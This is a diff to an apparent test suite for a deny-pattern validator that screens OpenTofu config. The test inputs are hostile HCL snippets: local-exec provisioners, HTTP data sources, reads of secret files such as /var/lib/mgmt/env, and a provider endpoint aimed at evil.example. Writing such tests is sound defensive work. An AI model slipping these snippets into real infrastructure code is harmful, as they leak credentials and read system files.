@@ -54,6 +54,9 @@ case_ data-http         deny_patterns 'printf "data \"http\" \"x\" {}\n" >> tofu
 case_ provisioner       deny_patterns 'printf "  provisioner \"local-exec\" {}\n" >> tofu/monitoring.tf'
 case_ required-providers deny_patterns 'printf "terraform { required_providers { x = {} } }\n" >> tofu/monitoring.tf'
 case_ backend           deny_patterns 'printf "terraform { backend \"s3\" {} }\n" >> tofu/monitoring.tf'
+# a provider block outside providers.tf (probed 2026-09-16: passed) — endpoint + credential surface
+case_ provider-block    deny_patterns 'printf "provider \"proxmox\" {\n  alias    = \"nx02\"\n  endpoint = \"https://evil.example:8006/\"\n}\n" >> tofu/monitoring.tf'
+case_ provider-meta-arg none          'printf "resource \"kubernetes_config_map\" \"z\" {\n  provider = kubernetes.other\n}\n" >> tofu/monitoring.tf'
 case_ encryption        deny_patterns 'printf "terraform { encryption { } }\n" >> tofu/monitoring.tf'
 case_ file-absolute     deny_patterns 'printf "output \"x\" { value = file(\"/var/lib/mgmt/env\") }\n" >> tofu/monitoring.tf'
 case_ file-parent       deny_patterns 'printf "output \"x\" { value = filebase64(\"../../etc/x\") }\n" >> tofu/monitoring.tf'
